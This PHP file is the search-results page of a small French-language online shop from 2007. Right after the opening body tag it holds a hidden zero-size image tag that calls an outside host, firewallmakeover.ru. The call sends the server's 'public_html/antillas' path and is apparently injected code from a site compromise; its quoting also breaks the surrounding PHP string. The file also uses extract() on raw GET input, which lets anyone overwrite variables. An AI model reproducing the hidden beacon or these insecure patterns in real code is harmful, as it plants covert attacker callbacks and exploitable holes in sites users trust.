<?php
/* Programme : Recherche_show.php
* 	Description : 
*	Auteur : Denis Léveillé 	 			  Date : 2007-11-18
*/
include('lib/config.php');

$motsIgnore = false;

if( !isset($_GET['produits']) ) {
	if( isset($_POST['Chaine']) && strlen($_POST['Chaine']) ) {
		$keywords = explode(" ",$_POST['Chaine']);
		
		for( $i = count($keywords)-1; $i > 0 ; $i-- ){
		    if( strlen( $keywords[$i] ) < 4)
		        $keywords[$i] = '';
		}

		$rechercheIds = recherche( $keywords, $_POST['categorie'] );
		$produits = selectionRecherche($rechercheIds);
		$i = 0;
	
		while( $motsIgnore == false && $i < count($keywords) ){
		    if(strlen($keywords[$i]) < 4)
		        $motsIgnore = true;
		    $i++;
		}
	}
	else
		$produits = false;
} // si produit deja define
else
	extract($_GET,EXTR_OVERWRITE);
//while( $produit = mysql_fetch_assoc( $produits ))
//	var_dump($produits);
//exit();

// ------------------------------------------------------------


// ------------------------------------------------------------
echo "
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//FR'>
<html  xmlns='http://www.w3.org/1999/xhtml'>
   <head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=recherche_show' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<form name='Recherche' action='' method='post'>
	<table  bgcolor='#FFFFFF' width='$Large' cellpadding='0' cellspacing='0' align='$Enligne' border='0' >
		<tr>
		<td>";

if( $motsIgnore ){
	echo "<center>".$txt['recherche_ignore_critere_moins_3_caracteres']."</center>";
}
if( $produits == false ) {
	echo "<br><p align=center><font size +2><b>".$txt['aucun_produit_recherche']."</b></font></p><br> ";
}
else {
	$TxCUC_USD = get_TauxVente("CUC"); 
//	$TxCUC_USD = get_TauxAchat("CUC");  
	$TXUSD_CAD = get_TauxVente("CAD"); 
	$TXUSD_EUR = get_TauxVente("EUR"); 
/*	$SymbCUC	=	get_Symbole("CUC");
	$SymbUSD	=	get_Symbole("USD");
	$SymbCAD	=	get_Symbole("CAD");
	$SymbEUR	=	get_Symbole("EUR");*/
	afficher_categorie_rech( $produits );

} // recherche réussi
echo "
		</td>
		</tr>
		  	<tr> 
		    	<td>";
include('bas_page.inc');
echo "
				</td>
		  	</tr>
	</table>
 </form>
<script language='JavaScript1.2'>

function Rafraichie(){
		window.location.reload();

//		 str = 'recherche_show.php?Chaine=".@$_POST['Chaine']."&categorie=".@$_POST['categorie']."'; 
//		 open(str,'_self','status=no,toolbar=no,menubar=no,location=no,resizable=no' );
}

function VoirZoom(No){
		str = 'zoom.php?id=' + No;
		 open( str, '_blank','left=10,top=10,width=460,height=500,status=no,toolbar=no,menubar=no,location=no,resizable=no' );
} // Rafraichie

</script>
</body>
</html>";
?>





